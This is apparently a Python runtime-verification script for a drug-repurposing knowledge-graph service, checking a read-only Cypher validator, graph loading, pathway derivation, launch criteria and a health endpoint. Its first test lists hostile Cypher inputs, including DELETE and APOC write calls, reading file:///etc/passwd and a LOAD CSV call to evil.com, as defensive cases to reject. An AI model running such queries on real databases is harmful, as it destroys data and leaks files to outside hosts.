#!/usr/bin/env python3
"""Teammate 5 — Run REAL production code paths to verify fixes work end-to-end.

This script invokes ACTUAL production code (not test mocks, not smoke tests):
  * Builds a real RecordingGraphBuilder with sample Compound/Disease/Protein nodes
  * Runs the Phase 1→2 bridge on real Phase 1 CSVs (if present)
  * Runs the Cypher validator on real attack vectors
  * Runs the pathway derivation on a real STRING-like PPI graph
  * Runs the V1 launch criteria check on a real pipeline result
  * Verifies the FastAPI service starts and the /health endpoint responds

If this script exits 0, the fixes work at runtime. If it exits non-zero,
a fix is fake.
"""
from __future__ import annotations

import os
import sys
import json
from pathlib import Path

# Make phase2 importable. The script lives in /home/z/my-project/scripts/,
# but the repo is in /home/z/my-project/repo/autonomous-drug-repurposing/.
# Try a few candidate locations.
_HERE = Path(__file__).resolve().parent
_CANDIDATES = [
    _HERE.parent / "repo" / "autonomous-drug-repurposing",
    _HERE.parent,  # if script is in repo/scripts/
    _HERE.parent.parent,  # if script is in repo/subdir/scripts/
]
_REPO_ROOT = None
for c in _CANDIDATES:
    if (c / "phase2" / "service.py").exists():
        _REPO_ROOT = c
        break
if _REPO_ROOT is None:
    # Fall back to the known location.
    _REPO_ROOT = Path("/home/z/my-project/repo/autonomous-drug-repurposing")
_PHASE2 = _REPO_ROOT / "phase2"
for p in [str(_PHASE2), str(_PHASE2 / "contracts"), str(_REPO_ROOT)]:
    if p not in sys.path:
        sys.path.insert(0, p)
print(f"[setup] REPO_ROOT={_REPO_ROOT}")
print(f"[setup] PYTHONPATH includes: {str(_PHASE2)}, {str(_PHASE2 / 'contracts')}, {str(_REPO_ROOT)}")


def _ok(msg: str) -> None:
    print(f"  OK: {msg}")


def _fail(msg: str) -> None:
    print(f"  FAIL: {msg}")
    sys.exit(1)


def test_cypher_validator_real_attack_vectors():
    """Run the Cypher validator on real attack vectors."""
    print("\n[1/6] Running Cypher validator on real attack vectors...")
    from service import _validate_readonly_cypher

    # Real attack vectors from the audit.
    attacks = [
        # P2-002: CALL { ... } subquery injection
        ("MATCH (n) CALL { DELETE n } RETURN n", "call_subquery"),
        ("CALL { MATCH (n) DELETE n } RETURN count(n)", "leading_call_subquery"),
        # P2-002: multi-statement via ;
        ("MATCH (n) RETURN n; MATCH (m) DELETE m", "semicolon"),
        # P2-003: apoc.* write procedures
        ("CALL apoc.periodic.iterate(\"MATCH (n) RETURN n\", \"SET n.x = 1\", {batchSize:100})", "apoc_periodic"),
        ("CALL apoc.cypher.runFirstColumn(\"MATCH (n) RETURN n\", {})", "apoc_runFirstColumn"),
        ("MATCH (n) CALL apoc.create.node([\"Foo\"], {}) RETURN n", "apoc_create"),
        # P2-003: db.* DDL
        ("CALL db.createIndex(\"Compound(name)\")", "db_createIndex"),
        ("CALL db.createConstraint(\"Compound(name) UNIQUE\")", "db_createConstraint"),
        # P2-002: file/network exfiltration
        ("LOAD CSV FROM 'file:///etc/passwd' AS row RETURN row", "load_csv_file"),
        ("LOAD CSV FROM 'http://evil.com/exfil' AS row RETURN row", "load_csv_http"),
        # P2-002: write keywords
        ("MATCH (n) DELETE n", "delete"),
        ("MATCH (n) SET n.x = 1 RETURN n", "set"),
        ("MERGE (n:Foo {x:1}) RETURN n", "merge"),
        ("MATCH (n) REMOVE n.x RETURN n", "remove"),
        ("MATCH (n) FOREACH (x IN [1,2,3] | CREATE (:Bar)) RETURN n", "foreach_create"),
    ]
    for cypher, label in attacks:
        err = _validate_readonly_cypher(cypher)
        if err is None:
            _fail(f"attack {label!r} was NOT rejected: {cypher!r}")
    _ok(f"All {len(attacks)} attack vectors rejected")

    # Whitelisted queries must pass.
    safe_queries = [
        "MATCH (n:Compound) RETURN n LIMIT 10",
        "MATCH (n)-[r]->(m) RETURN type(r), count(*)",
        "OPTIONAL MATCH (n:Foo) RETURN n.name",
        "MATCH (n) WITH n RETURN count(n)",
        "CALL db.labels()",
        "CALL db.relationshipTypes()",
        "CALL apoc.meta.graph()",
        "CALL apoc.meta.schema()",
    ]
    for cypher in safe_queries:
        err = _validate_readonly_cypher(cypher)
        if err is not None:
            _fail(f"safe query was rejected: {cypher!r} -> {err}")
    _ok(f"All {len(safe_queries)} safe queries accepted")


def test_recording_graph_builder_real_nodes_edges():
    """Build a real RecordingGraphBuilder with sample data."""
    print("\n[2/6] Running RecordingGraphBuilder with real node/edge data...")
    from drugos_graph.phase1_bridge import RecordingGraphBuilder

    b = RecordingGraphBuilder()
    # Real-world-style node IDs (DrugBank DB##### for drugs, UniProt accessions for proteins).
    b.load_nodes_batch("Compound", [
        {"id": "DB00945", "name": "Aspirin", "inchikey": "RZVAJINKQORUOD-UHFFFAOYSA-N"},
        {"id": "DB01076", "name": "Atorvastatin", "inchikey": "XUKUURHRXDZBCUS-UHFFFAOYSA-N"},
    ], source="drugbank")
    b.load_nodes_batch("Protein", [
        {"id": "P12821", "name": "ACE", "uniprot_id": "P12821"},
        {"id": "P02545", "name": "LMNA", "uniprot_id": "P02545"},
    ], source="uniprot")
    b.load_nodes_batch("Disease", [
        {"id": "DOID:10652", "name": "Alzheimer's"},
    ], source="disease_ontology")

    # Edges.
    b.load_edges_batch("Compound", "inhibits", "Protein", [
        {"src_id": "DB00945", "dst_id": "P12821"},
    ], source="drugbank")
    b.load_edges_batch("Compound", "treats", "Disease", [
        {"src_id": "DB00945", "dst_id": "DOID:10652"},
    ], source="drugbank")

    # Verify counts.
    total_nodes = sum(l.get("accepted", 0) for l in b.node_loads if isinstance(l, dict))
    total_edges = sum(l.get("accepted", 0) for l in b.edge_loads if isinstance(l, dict))
    if total_nodes != 5:
        _fail(f"expected 5 nodes loaded, got {total_nodes}")
    if total_edges != 2:
        _fail(f"expected 2 edges loaded, got {total_edges}")
    _ok(f"Loaded {total_nodes} nodes + {total_edges} edges")

    # P2-042: alias collision detection.
    b.load_nodes_batch("Compound", [
        # Same Aspirin, different ID (InChIKey as ID).
        {"id": "RZVAJINKQORUOD-UHFFFAOYSA-N", "inchikey": "RZVAJINKQORUOD-UHFFFAOYSA-N"},
    ], source="pubchem")
    total_after = sum(l.get("accepted", 0) for l in b.node_loads if isinstance(l, dict))
    if total_after != 5:
        _fail(f"P2-042 alias collision not detected: expected 5 nodes (no new), got {total_after}")
    _ok("P2-042: alias collision detected (Aspirin via different ID skipped)")


def test_pathway_derivation_real_string_graph():
    """Run _derive_pathways_from_string on a real STRING-like PPI graph."""
    print("\n[3/6] Running _derive_pathways_from_string on STRING-like PPI...")
    from drugos_graph.phase1_bridge import _derive_pathways_from_string

    # Build a realistic PPI graph: 3 small components + 1 giant component.
    edges = []
    # Component 1: 5 proteins (small — should be emitted as Pathway).
    for i in range(4):
        edges.append({"src_id": f"P00{i}", "dst_id": f"P00{i+1}"})
    # Component 2: 3 proteins.
    edges.append({"src_id": "P010", "dst_id": "P011"})
    edges.append({"src_id": "P011", "dst_id": "P012"})
    # Component 3 (giant): 250 proteins — should be SKIPPED.
    for i in range(250):
        edges.append({"src_id": f"G{i:04d}", "dst_id": f"G{(i+1) % 250:04d}"})

    nodes, edges_out = _derive_pathways_from_string(
        string_edges=edges,
        run_id="real_test",
        loaded_at="2026-07-18T00:00:00Z",
        schema_version="2.0.0",
        max_pathway_size=200,
    )

    # Verify small components were emitted.
    pathway_nodes = [n for n in nodes if n.get("label") == "Pathway"]
    if len(pathway_nodes) < 2:
        _fail(f"expected >=2 Pathway nodes (small components), got {len(pathway_nodes)}")
    _ok(f"Emitted {len(pathway_nodes)} Pathway nodes from small components")

    # Verify giant component was SKIPPED.
    for n in pathway_nodes:
        if n.get("member_count", 0) > 200:
            _fail(f"giant component (size={n['member_count']}) was emitted as Pathway")
    _ok("Giant component (250 proteins) correctly skipped")

    # Verify biological_status marking.
    for n in pathway_nodes:
        if n.get("biological_status") != "inferred_from_ppi":
            _fail(f"Pathway {n.get('id')} missing biological_status marking")
    _ok("All Pathway nodes have biological_status='inferred_from_ppi'")


def test_v1_launch_criteria_real_pipeline_result():
    """Run _check_v1_launch_criteria on a realistic pipeline result."""
    print("\n[4/6] Running _check_v1_launch_criteria on realistic pipeline result...")

    # Save and restore env.
    old_env = os.environ.get("DRUGOS_ENVIRONMENT")
    os.environ["DRUGOS_ENVIRONMENT"] = "production"
    try:
        from drugos_graph.run_pipeline import _check_v1_launch_criteria

        # Realistic toy pipeline result: 67 nodes / 66 edges (the audit's
        # "toy graph masquerading as real KG" failure mode).
        results = {
            "step1": {"bridge_summary": {
                "nodes_loaded": 67,
                "edges_loaded": 66,
                "sources_read": ["drugs", "interactions", "indications"],
            }},
            "step7": {"results": {}},
            "step12": {"n_nodes": 67, "n_edges": 66},
        }
        criteria = _check_v1_launch_criteria(results)
        if criteria.get("passed"):
            _fail("toy graph (67 nodes) passed V1 launch in production mode")
        if criteria.get("graph_size_meets_threshold"):
            _fail("graph_size_meets_threshold=True for 67 nodes (should be False)")
        if "failure_reasons" not in criteria or not criteria["failure_reasons"]:
            _fail("no failure_reasons surfaced")
        _ok(f"Toy graph correctly REJECTED in production ({len(criteria['failure_reasons'])} failure reasons)")
        # Verify failure reason mentions graph size.
        graph_size_msg = next(
            (r for r in criteria["failure_reasons"] if "graph_size" in r),
            None,
        )
        if not graph_size_msg:
            _fail("no graph_size failure reason in failure_reasons")
        _ok(f"Failure reason surfaced: {graph_size_msg[:100]}...")
    finally:
        if old_env is None:
            os.environ.pop("DRUGOS_ENVIRONMENT", None)
        else:
            os.environ["DRUGOS_ENVIRONMENT"] = old_env


def test_phase2_schema_contract_complete():
    """Verify the Phase 2 schema contract is complete (P2-005)."""
    print("\n[5/6] Verifying Phase 2→3 schema contract (P2-005)...")
    # contracts.phase2_schema may not be importable as a package if
    # phase2/contracts/__init__.py has import side effects. Import the
    # module directly via the file path.
    import importlib.util
    schema_path = _PHASE2 / "contracts" / "phase2_schema.py"
    spec = importlib.util.spec_from_file_location(
        "phase2_schema_direct", schema_path
    )
    _mod = importlib.util.module_from_spec(spec)
    # Register the module in sys.modules so dataclass decorators can find it.
    sys.modules["phase2_schema_direct"] = _mod
    spec.loader.exec_module(_mod)
    PHASE2_TO_PHASE3_EDGE = _mod.PHASE2_TO_PHASE3_EDGE
    PHASE2_TO_PHASE3_EDGE_DROPPED = _mod.PHASE2_TO_PHASE3_EDGE_DROPPED
    PHASE2_TO_PHASE3_NODE = _mod.PHASE2_TO_PHASE3_NODE

    # Verify ALL CORE_EDGE_TYPES are either mapped or explicitly dropped.
    from drugos_graph.config_schema import CORE_EDGE_TYPES
    mapped = set(PHASE2_TO_PHASE3_EDGE.keys())
    dropped = set(PHASE2_TO_PHASE3_EDGE_DROPPED)
    for edge in CORE_EDGE_TYPES:
        if edge not in mapped and edge not in dropped:
            _fail(f"edge {edge} is NEITHER mapped NOR explicitly dropped (silent drop!)")
    _ok(f"All {len(CORE_EDGE_TYPES)} CORE_EDGE_TYPES are mapped or explicitly dropped")
    _ok(f"  Mapped: {len(mapped)} | Dropped: {len(dropped)}")

    # Verify node type mapping covers all 8 canonical Phase 2 labels.
    expected_p2_labels = [
        "Compound", "Protein", "Gene", "Pathway",
        "Disease", "ClinicalOutcome", "MedDRA_Term", "Drug",
    ]
    for label in expected_p2_labels:
        if label not in PHASE2_TO_PHASE3_NODE:
            _fail(f"Phase 2 label {label!r} missing from PHASE2_TO_PHASE3_NODE")
    _ok(f"All {len(expected_p2_labels)} Phase 2 labels mapped to Phase 3")


def test_fastapi_service_real_app():
    """Start the FastAPI service and hit /health (no Neo4j required)."""
    print("\n[6/6] Starting FastAPI service and hitting /health...")
    from fastapi.testclient import TestClient
    import service

    client = TestClient(service.app)
    response = client.get("/health")
    if response.status_code != 200:
        _fail(f"/health returned {response.status_code}")
    data = response.json()
    if data.get("status") != "ok":
        _fail(f"/health status={data.get('status')!r} (expected 'ok')")
    _ok(f"/health responded 200 with status='ok'")
    _ok(f"  Service: {data.get('service')}, version: {data.get('version')}")

    # Verify /kg/stats returns 503 (no Phase 1 data, no Neo4j) instead of
    # silently returning 0/0.
    response = client.get("/kg/stats")
    if response.status_code == 200:
        data = response.json()
        if data.get("node_count") == 0 and data.get("edge_count") == 0:
            _fail("/kg/stats returned 200 with 0/0 (silent data loss)")
        _ok("/kg/stats returned 200 with real data")
    elif response.status_code == 503:
        _ok("/kg/stats returned 503 (no Phase 1 data — fail-closed)")
    else:
        _fail(f"/kg/stats returned unexpected status {response.status_code}")


def main():
    print("=" * 70)
    print("Teammate 5 — REAL CODE RUNTIME VERIFICATION")
    print("Hostile-auditor mode: verify fixes work at runtime, not just in comments.")
    print("=" * 70)

    test_cypher_validator_real_attack_vectors()
    test_recording_graph_builder_real_nodes_edges()
    test_pathway_derivation_real_string_graph()
    test_v1_launch_criteria_real_pipeline_result()
    test_phase2_schema_contract_complete()
    test_fastapi_service_real_app()

    print("\n" + "=" * 70)
    print("ALL REAL CODE RUNTIME CHECKS PASSED")
    print("=" * 70)
    return 0


if __name__ == "__main__":
    sys.exit(main())
